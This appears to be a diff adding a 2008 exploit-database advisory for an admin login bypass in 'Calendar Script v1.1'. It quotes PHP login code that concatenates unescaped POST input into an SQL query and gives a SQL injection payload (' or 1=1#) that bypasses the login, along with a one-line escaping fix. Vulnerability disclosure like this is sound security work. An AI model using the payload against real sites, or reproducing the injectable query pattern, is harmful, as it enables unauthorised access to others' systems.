@@ -1,0 +1,44 @@
+ -----------------------------------------------------
+ Calendar Script v1.1 Admin Login Bypass Vulnerability
+ -----------------------------------------------------
+ by athos - staker[at]hotmail[dot]it
+ http://www.hotscripts.com/jump.php?listing_id=71365&jump_type=1
+
+ File Vuln "index.php" (code details)
+
+ ------------------------------------------------------------
+
+ 4.  $action = $_POST['action'];
+ 5.
+ 6.  switch($action) {
+ 7.  case 'login':
+ 8.  // login
+ 9.  $username = stripslashes(trim($_POST['username']));
+ 10. $password = sha1(stripslashes(trim($_POST['password'])));
+ 11.
+ 12. if(empty($username) || empty($password)) {
+ 13. // Stop, someone tried entering nothing into here
+ 14. // Show an error.
+ 15. $loginMsg = 'You must enter a username and password';
+ 16. } else {
+ 17. // The input seems to be ok, check it against the database.
+ 18. $checkDetails = mysql_query("SELECT id FROM user WHERE username='$username' AND password='$password' LIMIT 1", $conn);
+
+ ------------------------------------------------------------
+
+ Exploit
+
+ http://[host]/[path]/index.php
+
+ (Login) Username: ' or 1=1# & Password: anything
+
+ ------------------------------------------------------------
+
+ Fix: $username = mysql_real_escape_string($_POST['username']);
+
+ Note: works regardless php.ini settings (str0ke =D)
+       don't add me on msn messenger
+
+ ------------------------------------------------------------
+
+# milw0rm.com [2008-12-22]
